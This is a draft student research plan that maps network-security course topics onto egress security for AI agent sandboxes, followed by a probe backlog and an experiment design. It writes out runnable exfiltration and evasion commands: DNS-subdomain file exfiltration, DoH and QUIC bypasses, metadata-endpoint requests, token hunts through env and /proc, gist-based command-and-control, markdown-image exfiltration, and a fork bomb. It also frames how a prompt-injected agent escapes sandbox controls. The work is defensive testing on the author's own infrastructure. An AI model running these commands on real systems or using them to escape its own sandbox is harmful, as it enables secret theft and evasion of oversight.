---
title: Network Security Course → Agent Sandbox Mapping
description: Which topics from a graduate network-security course carry over to agent-sandbox network security, with a backlog of probes for the experiments.
author: Jennifer Cwagenberg
created: 2026-11-14
updated: 2026-11-14
status: draft
phase: prework
focus: network-security
tags:
  - agent-sandboxes
  - network-security
  - egress
  - threat-model
  - research
---

# Network Security Course → Agent Sandbox Mapping

Source: the 20 lecture decks of Georgia Tech ECE 6612 (Computer Network Security). Everything below is summarized in my own words; no slide content is reproduced. Related: [paper-review.md](paper-review.md), [Sandboxes.md](Sandboxes.md).

## Summary

**In an agent sandbox, the threat comes from inside.** Classic network security puts a perimeter around trusted insiders and keeps outsiders out. The course names the *malicious insider* as the case firewalls handle badly. A prompt-injected or misaligned agent is exactly that: an insider trying to get **out**.

That changes what the course material is for:
- **Firewall-evasion techniques** (port hiding, tunneling, DNS tunnels) were taught as things an attacker on your network might do. Here they are what the sandboxed agent will try.
- **Botnet behavior** (phoning home to C&C, DGAs) was taught for detecting compromised hosts. Here it describes a prompt-injected agent fetching instructions and sending data back.
- **Host IDS vs network IDS** corresponds to enforcing policy inside the guest vs on the host. The argument that a host IDS can be compromised along with the host is the argument for host-side enforcement.

Of the 20 lectures, 10 transfer directly (Tier 1), 6 are useful framing (Tier 2), and 3 contribute little (Tier 3). The decks 12 and 13 (TLS) and 15 and 17 (web) are grouped as pairs.

## Tier 1: direct and high value

### L19: Network access control and DoS
- **Concepts:** default deny vs default allow; stateless packet filters vs stateful connection tracking; first-match rule ordering; application proxies as controlled chokepoints; getting around firewalls by hiding on other ports or tunneling (including DNS tunneling); deep packet inspection; the malicious-insider limit of perimeters; DoS through resource exhaustion and amplification.
- **How it applies:** this is the core model for sandbox egress.
  - The *application proxy* pattern is the egress proxy. Because the proxy acts as a middleman at the application level, it is also where credentials can be injected.
  - The "getting around firewalls" material is the agent's attack list.
  - Resource exhaustion covers the agent as a DoS source (outbound floods) and as a noisy neighbor to other sandboxes.
- **Probes:**
  - Raw-IP connections that skip DNS.
  - Non-standard ports.
  - HTTP CONNECT to arbitrary ports.
  - A DNS tunnel (iodine-style).
  - Classify whether each sandbox filters at L3/L4 or at L7.
  - Outbound flood and fork bomb against cgroup/VM limits.

### L10: DNS security
- **Concepts:** resolver hierarchy and caching; cache poisoning; bailiwick checking; spoofing by guessing the 16-bit transaction ID; the Kaminsky attack using random subdomains; source-port randomization as added entropy.
- **How it applies:**
  - DNS is an **exfiltration channel**. Data encoded in the query name reaches the attacker's authoritative nameserver through any recursive resolver, even when HTTP egress is blocked. The traffic looks like the Kaminsky pattern: many unique subdomains under one zone.
  - Whoever runs the sandbox's resolver is the point of control.
  - DNS rebinding (an allowed name that resolves to a private IP) is why Permission Denied rechecks resolved addresses.
- **Probes:**
  - Encode data into subdomains of a zone we control, then check our nameserver logs.
  - Point a rebinding domain at 127.0.0.1, RFC 1918 addresses, and 169.254.169.254.
  - Bypass the sandbox resolver by sending queries straight to 8.8.8.8:53.

### L11: DNSSEC, DoT, DoH
- **Concepts:** DNSSEC chain of trust; NSEC/NSEC3 zone enumeration; the question of who validates (usually the local resolver); DNS over TLS (port 853) and DNS over HTTPS (443).
- **How it applies:**
  - **DoH defeats resolver-based allowlists.** The agent can resolve any name, or tunnel data, through a public DoH endpoint on 443, and the traffic looks like ordinary HTTPS.
  - A sandbox that filters DNS has to block known DoH/DoT endpoints too, or force all DNS through its own resolver.
- **Probes:** DoH to the major public resolvers; DoT on port 853; DoH through an allowlisted CDN domain.

### L12–13: TLS and certificates
- **Concepts:** the TLS handshake, with **SNI visible in the ClientHello**; Web PKI and chains of trust; certificate pinning; SSL stripping and HSTS; revocation (CRL, OCSP, stapling); TLS does not fix application-level flaws.
- **How it applies:** a domain allowlist works in one of three places:
  - (a) on SNI, without decrypting;
  - (b) on the HTTP CONNECT host;
  - (c) by terminating TLS (MITM), which needs a CA the sandbox trusts.

  **Credential injection requires (c).** Pinning clients break (c). If the SNI and the HTTP `Host` header can differ (domain fronting), an SNI-only filter can be bypassed. Encrypted Client Hello (ECH, a follow-on not covered in the course) blinds SNI-based filtering altogether.
- **Probes:**
  - Classify each sandbox as SNI, CONNECT, or MITM.
  - Send a request where the SNI is allowed and the `Host` header is not.
  - Find where the MITM CA key lives and whether the agent can read it.
  - Check whether HTTP (no TLS) to an allowed host goes through without a credential leaking.

### L14: QUIC
- **Concepts:** QUIC = TCP + TLS 1.3 in user space over UDP 443; encrypted transport headers mean middleboxes can't inspect it; networks block UDP 443 to force clients back to TCP; MASQUE tunneling over HTTP/3.
- **How it applies:**
  - A proxy that only handles TCP/CONNECT doesn't see QUIC. If UDP isn't blocked, HTTP/3 traffic skips the proxy.
  - The enterprise fix, blocking UDP 443 so clients fall back to TCP, is a ready-made sandbox policy.
- **Probes:** an HTTP/3 fetch (`curl --http3`); a raw UDP 443 send to an endpoint we control.

### L07: Network layer
- **Concepts:** private ranges (RFC 1918); **networks often filter IPv4 but forget IPv6**; ingress/egress filtering against spoofing; ICMP for reconnaissance; IPsec and VPN tunnels.
- **How it applies:**
  - Covers blocking private ranges and link-local addresses, which include the cloud metadata endpoint.
  - IPv6 bypass of IPv4-only rules is a classic gap and cheap to test.
  - An agent can start its own user-space VPN, which is just another tunnel.
- **Probes:** IPv6 egress; ICMP echo and ICMP tunneling; reaching RFC 1918, link-local, and `169.254.169.254`; a WireGuard/UDP tunnel to an endpoint we control; a spoofed source IP.

### L20: Malware, worms, and botnets
- **Concepts:** bots "phone home" to command-and-control (C&C); domain generation algorithms (DGAs); fast flux; bulletproof hosting; host IDS vs network IDS; worms scanning for targets; NAT and stateful firewalls blunted worm spread.
- **How it applies:**
  - A prompt-injected agent acts like a bot: it fetches instructions and sends back data, often through **allowed** services (gists, paste sites, issue trackers, package registries).
  - Host IDS vs network IDS corresponds to enforcing in the guest vs on the host.
  - Worm-style scanning corresponds to an agent mapping the internal network.
- **Probes:**
  - A fake C&C round trip over allowlisted domains: read a command from a gist, post the result as a comment.
  - Internal subnet scans from inside the sandbox.

### L16: Web security (CSRF, XSS, SQLi, CSP)
- **Concepts:** pages trigger automatic fetches (`<img src>`) that carry the user's cookies, which is CSRF; XSS makes the browser run untrusted data as code; CSP `connect-src`/`img-src` are destination allowlists; sanitization is fragile; prepared statements keep code and data apart by construction.
- **How it applies:**
  - Auto-fetched image URLs are the **markdown-image exfiltration** vector when a harness or UI renders the agent's output.
  - CSRF's ambient authority is the agent holding credentials and acting as a confused deputy.
  - XSS and SQLi are earlier forms of prompt injection. "Sanitization is fragile, prepared statements fix it structurally" matches the papers' finding that prompt-layer defenses fail while network and structural controls work.
  - CSP is a working, widely deployed example of a per-resource destination allowlist.
- **Probes:** have the agent emit `![](https://our-domain/?d=<data>)` and check whether the harness renders and fetches it; does the egress policy apply to the harness process as well as the agent's tools?

### L15 + L17: Web basics and web authentication
- **Concepts:** an origin is an exact string match on protocol + host + port; cookie domain scoping (suffix matching, host-only cookies, `__Host-` prefix); cookies and tokens are bearer credentials; SSO tokens; passkeys keep no server-side secret and are bound to a domain.
- **How it applies:**
  - Allowlist matching (exact host vs `*.` suffix, whether port and scheme count) is the same design question as origin and cookie scoping, and it should be written down per sandbox.
  - Any bearer token readable inside the sandbox can be stolen and replayed.
  - A credential bound to one destination and injected at the boundary is the passkey idea applied to agents.
- **Probes:** document wildcard depth and port/scheme handling for each sandbox; send an injected credential's destination to a look-alike host and see whether the token leaks; read the environment, files, and process memory for tokens.

## Tier 2: useful framing or a secondary threat

| Lecture | What transfers |
|---|---|
| **L02 Network overview** | The TCP/IP layer model gives a **taxonomy for classifying controls**: L3 (IP/CIDR), L4 (port/protocol), L7 (domain/HTTP). The protocol inventory (DNS, NTP, SMTP, SSH, FTP) doubles as a checklist of channels to test. |
| **L06 Link layer** | Several sandboxes on one bridge are like a shared LAN: ARP and DHCP spoofing or sniffing between sandboxes. The course concludes that the fix has to come from the network infrastructure, not the endpoints, which supports host-side enforcement. If the agent controls the guest's network config, in-guest enforcement can't be trusted. |
| **L09 Transport layer** | Stateful tracking by 4-tuple underlies per-sandbox firewall rules. UDP has no connection state, so it's the easier channel for exfiltration and spoofing. |
| **L18 Email security** | SMTP (25/587) and IMAP are an exfiltration channel to block and test. STARTTLS stripping is the same downgrade pattern as a proxy that quietly drops TLS. SPF/DKIM are a model for "authorized sender" identity. |
| **L04 Hashes/MACs, L05 Public key** | Building blocks: hash chains or HMACs for **tamper-evident audit logs** (the survey lists audit isolation as a requirement); key separation for injected credentials; hash-pinned package downloads to limit supply-chain abuse of allowlisted registries. |

## Tier 3: little direct transfer

- **L03 Symmetric crypto:** background only. The point that encryption doesn't provide integrity is worth citing if proxy-signed requests come up.
- **L08 BGP/routing:** no direct use. At most an analogy for why IP-based allowlists are brittle: routing and CDN mappings change, which Caging the Agents also notes.
- **L01 Intro:** the **ethics and legal material applies to how we test**. Every exfiltration, tunneling, or C&C probe must target only endpoints and domains we own and control.

## How the course fills the gaps in the literature

These map to the gaps in [paper-review.md](paper-review.md#gaps-this-project-could-fill):

1. **Comparing network enforcement across products** ← L02 layer taxonomy; L19 stateless vs stateful vs proxy; L12–13 SNI vs CONNECT vs MITM.
2. **Covert channels** ← L19 tunneling and port hiding; L10 DNS exfiltration; L11 DoH/DoT; L14 QUIC; L07 IPv6 and ICMP; L18 SMTP.
3. **Cloud metadata and internal-network SSRF** ← L07 private and link-local ranges; L10 rebinding.
4. **Credential injection as a measured defense** ← L19 application proxy; L12–13 TLS termination and CA trust; L15/L17 bearer vs bound credentials.
5. **Agent-driven bypass** ← L19 malicious insider and getting around firewalls; L20 C&C and DGA behavior.

## Probe backlog

Run each probe from inside each sandbox in [Sandboxes.md](Sandboxes.md), against endpoints we control. **P1** = run first; **P2** = after P1 results.

### L3: IP
- [ ] **P1** Raw-IP egress to an allowlisted service's IP, without DNS (L19)
- [ ] **P1** IPv6 egress when only IPv4 rules exist (L07)
- [ ] **P1** RFC 1918, loopback-to-host, and `169.254.169.254` metadata reachability (L07)
- [ ] **P2** ICMP echo and ICMP tunnel (L07)
- [ ] **P2** Spoofed source IP leaves the sandbox (L07)
- [ ] **P2** Internal subnet scan / lateral reach to other sandboxes (L06, L20)

### L4: Transport
- [ ] **P1** Non-standard TCP ports to an endpoint we control (L19)
- [ ] **P1** Raw UDP 443 and HTTP/3 fetch (L14)
- [ ] **P2** WireGuard / UDP VPN tunnel (L07, L19)
- [ ] **P2** SMTP 25/587 egress (L18)
- [ ] **P2** Outbound flood rate and fork bomb vs resource limits (L19)

### DNS
- [ ] **P1** Subdomain-encoded exfiltration through the sandbox resolver (L10)
- [ ] **P1** Direct UDP/TCP 53 to a public resolver, bypassing the sandbox resolver (L10)
- [ ] **P1** DoH to public resolvers on 443; DoT on 853 (L11)
- [ ] **P1** DNS rebinding: allowed name → private/metadata IP (L10)
- [ ] **P2** Full IP-over-DNS tunnel (iodine-style) (L19)

### L7: TLS / HTTP
- [ ] **P1** Classify enforcement: SNI vs CONNECT host vs MITM (L12–13)
- [ ] **P1** SNI/Host mismatch (domain fronting) through an allowed CDN (L12–13)
- [ ] **P1** Allowlist matching semantics: wildcard depth, port, scheme, IDN/look-alike hosts (L15)
- [ ] **P1** Exfiltration through allowlisted services: gist/paste/issue comment as C&C (L20)
- [ ] **P1** Markdown/HTML image auto-fetch exfiltration via the harness (L16)
- [ ] **P2** Where the MITM CA key lives; can the agent read or add trust anchors? (L12–13)
- [ ] **P2** Plain HTTP to an allowed host: does an injected credential leak? (L13, L17)

### Credentials
- [ ] **P1** Search for tokens in env, files, and process memory inside the sandbox (L15, L17)
- [ ] **P2** Injected credential sent to a look-alike or redirected host (L17)
- [ ] **P2** Does egress policy apply to harness-originated traffic (telemetry, updates) and to agent tools in the same way? (L16, L20)

---

# Experiment design

This section turns the backlog into runnable experiments. It is written for a **school project**: every test runs **from inside a sandbox you operate, against infrastructure you own**. No test touches a third party's systems, so nothing here needs anyone else's authorization. The legal material in L01 (CFAA, Wiretap Act) is the reason for that boundary, not a formality — keep the target list to your own hosts and domains.

## Method

Each sandbox is one **subject**. Each probe is one **trial**. A trial has a fixed shape:

1. **Arrange** the controlled endpoint (listener, nameserver, or metadata mock) so a success leaves a record *outside* the sandbox you can't fake from inside.
2. **Act**: run one command from inside the sandbox.
3. **Observe** in two places and compare them:
   - *inside*: the command's exit status and output;
   - *outside*: did the packet/connection/query actually arrive at your endpoint?
4. **Classify** the outcome against the rubric below.

The inside/outside split matters. A `curl` that hangs and times out looks the same to the agent whether the proxy dropped it or the network is slow; only your endpoint's logs tell you which. **Egress is confirmed only by arrival at the controlled endpoint, never by the client's own success message.**

### Outcome rubric

| Code | Meaning | Evidence |
|---|---|---|
| **BLOCKED** | traffic never left the boundary | nothing at the endpoint; inside sees refused/timeout/DNS failure |
| **LEAKED** | traffic reached the endpoint | request logged at the endpoint, with its payload |
| **ALLOWED-OK** | reached an intended, allowlisted destination (the control case) | expected success both sides |
| **MANGLED** | reached the endpoint but altered (TLS terminated, header rewritten, credential substituted) | endpoint sees a different cert/SNI/header than was sent |
| **ERROR** | the sandbox couldn't run the probe (tool missing, no interpreter) | note it; not a security result |

A `BLOCKED` is only meaningful next to an `ALLOWED-OK` control in the same sandbox: it shows the sandbox *can* carry that protocol and chose to stop this instance, rather than lacking the capability. So most probes are run as a **pair**: one to an allowed destination, one to a denied destination, same command shape.

### What to record per trial

One row in `results/` per (sandbox × probe):

```
sandbox, probe_id, layer, lecture, command, allowed_dest_outcome,
denied_dest_outcome, enforcement_point (guest|host|proxy|none),
evidence_path, notes, date
```

`enforcement_point` is the real deliverable: the course's L20 host-IDS-vs-network-IDS point is answered empirically by *where* the block happened. Infer it from behavior: a block visible as an iptables REJECT inside the guest is guest-side; a RST from a proxy process is proxy-side; a drop with no in-guest artifact is host-side.

## Controlled infrastructure (build once)

All four fit on one cheap VPS plus one domain you register for the project.

- **A. Echo/collector** — an HTTPS + plain-HTTP server on your VPS that logs method, path, headers, SNI, source IP, and body to a file. A ~20-line Flask/`http.server` app behind nginx. This is the endpoint for every HTTP/TLS/port/exfiltration probe. Add a raw TCP and a UDP listener (`ncat -lk` / `ncat -u -lk`) on several ports for the L4 probes.
- **B. Authoritative nameserver** — delegate a zone, e.g. `lab.example.com`, to your VPS and run a nameserver that **logs every query name** (a tiny Python `dnslib` responder is enough; it doesn't need to answer usefully, only to log). Any query that reaches it proves DNS egress, and the subdomain carries the exfiltrated bytes. This is the endpoint for all DNS probes.
- **C. Rebinding + metadata mock** — one hostname whose record you can flip between your VPS IP and a target like `169.254.169.254`, and a local mock of the cloud metadata service so a hit is unambiguous and harmless.
- **D. Payload marker** — a per-trial random token (e.g. `trial-7f3a`) embedded in every payload, so a hit in a log is traceable to the exact trial and can't be confused with background noise.

## Per-probe specifications

Format: **concept (lecture) → setup → command (from inside the sandbox) → BLOCKED looks like / LEAKED looks like**. Commands use a placeholder `COLLECTOR=you.example.com` (infra A) and `ZONE=lab.example.com` (infra B). Run the allowed-destination control alongside each.

### L3 — IP layer

**P1 · Raw-IP egress, no DNS (L19, egress filtering vs L7 allowlist)**
- Why: distinguishes a filter that works on IP/port from one that works on hostname. If only the resolver is policed, a hard-coded IP walks out.
- Command: `curl -s --resolve anything:443:<COLLECTOR_IP> https://anything/trial-XXXX` — or simpler, `curl https://<COLLECTOR_IP>/trial-XXXX`.
- BLOCKED: connection refused/timeout, nothing in collector log. LEAKED: collector logs the path with the token.

**P1 · IPv6 egress (L07, forgotten IPv6 firewall)**
- Setup: give the collector a AAAA record / reach it over IPv6.
- Command: `curl -6 https://[<COLLECTOR_V6>]/trial-XXXX` and `curl -g 'http://[2606:4700:4700::1111]'` as a liveness check.
- LEAKED is the interesting result: the sandbox filters IPv4 but lets IPv6 straight out. Very common; cheap to check.

**P1 · Private ranges + metadata (L07, link-local / SSRF)**
- Command set, each expecting BLOCKED:
  - `curl -s --max-time 3 http://169.254.169.254/latest/meta-data/` (cloud metadata)
  - `curl -s --max-time 3 http://10.0.0.1/` and `http://192.168.0.1/` (RFC 1918)
  - `curl -s --max-time 3 http://<host-gateway-ip>/` (reach the host)
- LEAKED on the metadata line is the highest-severity finding; note whether credentials come back.

**P2 · ICMP (L07, recon/tunnel)**: `ping -c1 <COLLECTOR_IP>`; tcpdump on the collector confirms arrival. Tunnel variant with `ptunnel` is P2.

**P2 · Spoofed source IP (L07, ingress/egress filtering)**: needs raw-socket capability (`scapy`); send a packet with a forged source to the collector and check whether the recorded source IP is the forgery (no egress filtering) or the sandbox's real/NAT address.

**P2 · Internal scan / lateral reach (L06, L20, worm scanning)**: `nmap -sT <sandbox_subnet>/24` from one sandbox; can it see sibling sandboxes or host services? Records blast radius if one sandbox is compromised.

### L4 — Transport

**P1 · Non-standard ports (L19, hiding on other ports)**
- Setup: collector listens on 443, 80, 22, 53, 8080, 31337.
- Command: loop `for p in 443 80 22 53 8080 31337; do curl -s --max-time 3 http://$COLLECTOR:$p/trial-XXXX-$p; done`.
- Result is a **port profile**: which ports leak. A proxy that only intercepts 80/443 often lets 31337 straight through.

**P1 · UDP 443 / HTTP/3 (L14, QUIC skips a TCP proxy)**
- Command: `curl --http3-only https://$COLLECTOR/trial-XXXX` (needs an HTTP/3-capable curl) and a raw probe `ncat -u $COLLECTOR 443 <<< "trial-XXXX"` with `ncat -u -lk 443` on the collector.
- LEAKED on UDP while the TCP equivalent is MANGLED/proxied is the headline QUIC result.

**P2 · UDP VPN tunnel (L07/L19)**: bring up WireGuard to your VPS; if the handshake completes, all egress policy is moot. P2 because setup-heavy.

**P2 · SMTP egress (L18)**: `ncat $COLLECTOR 25` / `587`; does raw mail-port egress leave?

**P2 · Resource exhaustion (L19, DoS source / noisy neighbor)**: measured, bounded, against your own collector only — short outbound packet burst to measure the rate cap; a `:(){ :|:& };:` fork bomb **only** if you can kill the sandbox, to check cgroup PID limits. Record the cap, don't actually flood a third party.

### DNS

**P1 · Subdomain exfiltration through the sandbox resolver (L10)**
- Command: `for i in 1 2 3; do dig $(echo "secret$i-trial-XXXX").$ZONE; done` — or encode a file: `xxd -p secret | fold -w32 | while read c; do dig $c.$ZONE; done`.
- LEAKED: your nameserver logs the chunks, reassemble the secret. This works even when **all** HTTP egress is blocked, which is the point.

**P1 · Direct resolver, bypassing the sandbox resolver (L10)**
- Command: `dig @8.8.8.8 $ZONE` and `dig @1.1.1.1 test.$ZONE`.
- Tests whether the sandbox forces its own resolver or lets the agent talk to any resolver on 53.

**P1 · DoH / DoT (L11, encrypted DNS defeats a resolver allowlist)**
- Command: `curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=test.'$ZONE` and `curl 'https://cloudflare-dns.com/dns-query?name=test.'$ZONE'&type=A'`; DoT with `kdig -tls @1.1.1.1 test.$ZONE`.
- If these reach your nameserver, DNS policy is bypassable over 443/853 and looks like ordinary HTTPS.

**P1 · Rebinding → private/metadata (L10, infra C)**
- Setup: `rebind.$ZONE` answers with a short TTL, flipped to `169.254.169.254`.
- Command: `curl http://rebind.$ZONE/latest/meta-data/`.
- Checks whether the allowlist re-validates the *resolved IP* (the Permission Denied defense) or trusts the name.

### L7 — TLS / HTTP

**P1 · Classify enforcement: SNI vs CONNECT vs MITM (L12–13)** — the keystone experiment.
- Procedure, all to the collector:
  1. `curl -v https://$COLLECTOR/trial-XXXX` and read the server cert inside the sandbox. If it's **your** cert → not MITM; if it's a sandbox CA → **MANGLED/MITM**.
  2. `openssl s_client -connect $COLLECTOR:443 -servername allowed.example.com` while the real destination differs → does it decide on SNI?
  3. Compare the collector's recorded SNI and `Host` header to what you sent.
- Output: each sandbox labeled SNI / CONNECT-host / MITM / none. Feeds gap 1 in `paper-review.md`.

**P1 · SNI/Host mismatch — domain fronting (L12–13)**
- Command: `curl -s --connect-to ::allowed-cdn.example.com: https://$COLLECTOR/ -H 'Host: denied.example.com'`, or send allowed SNI with a denied `Host`.
- LEAKED/MANGLED where the SNI is allowlisted but the Host isn't shows SNI-only filtering is bypassable.

**P1 · Allowlist matching semantics (L15, origin/cookie-scope analogy)**
- Register/point several names and probe each: `exact.$ZONE`, `sub.deep.$ZONE` (wildcard depth), `$COLLECTOR:8443` (port in the rule?), `http://` vs `https://` (scheme), and an IDN/look-alike (`аllowed` with a Cyrillic а).
- Output: a per-sandbox table of what the allowlist actually matches. Pure observation, high value, low risk.

**P1 · Exfiltration via allowlisted services — C&C pattern (L20)**
- If GitHub/pastebin/etc. are allowlisted: read a "command" from a gist you own, write the result back as a gist/comment. Use your own account and your marker token.
- Shows that an allowlist of *reputable* domains still permits bidirectional C&C. Maps to gap 2.

**P1 · Markdown/HTML image auto-fetch (L16)**
- Have the agent emit `![x](https://$COLLECTOR/img-trial-XXXX.png?d=<secret>)` into whatever the harness renders (chat UI, PR comment, notebook).
- LEAKED: the collector logs the fetch — the exfiltration happens in the **harness/renderer**, possibly outside the sandbox's egress policy entirely. Note which process made the request.

**P2 · CA key location (L12–13)**: if MITM, find the injected CA (`ls /etc/ssl/certs`, env `*CA*`); can the agent read its private key or add a trust anchor? If yes, interception is also forgeable by the agent.

**P2 · Plain-HTTP credential leak (L13, L17)**: request an allowed host over `http://` and watch whether a boundary-injected credential is attached in cleartext to the collector.

### Credentials

**P1 · Token hunt (L15, L17, bearer credentials)**: inside the sandbox, `env | grep -iE 'key|token|secret|cred'`, search mounted files, and `/proc/*/environ` of sibling processes. Records what a prompt-injected agent could read and replay. Strictly read-only, inside your own sandbox.

**P2 · Credential to look-alike host (L17, phishing-resistant binding)**: does a boundary-injected credential go only to its intended host, or will the proxy attach it to a redirected/look-alike destination? Tests whether injection is destination-bound (the passkey property).

**P2 · Harness vs tool egress parity (L16, L20)**: compare where telemetry/update traffic from the harness goes vs where the agent's `curl` is allowed to go. A harness exempt from the policy is a hole.

## Suggested write-up arc (for the project)

1. **Taxonomy** (L02): classify each sandbox's controls by layer — one figure.
2. **Matrix**: subjects (sandboxes) × probes, each cell an outcome code — the core result table.
3. **Enforcement point** per sandbox (guest/host/proxy), argued from where blocks appear (L20).
4. **Bypass narrative**: for the most-hardened sandbox, the shortest chain of probes that still leaks (e.g. IPv6 → DoH → allowlisted-gist C&C).
5. **Back to the literature**: which `paper-review.md` gaps your matrix fills, and where your results agree with Silent Egress / Permission Denied.
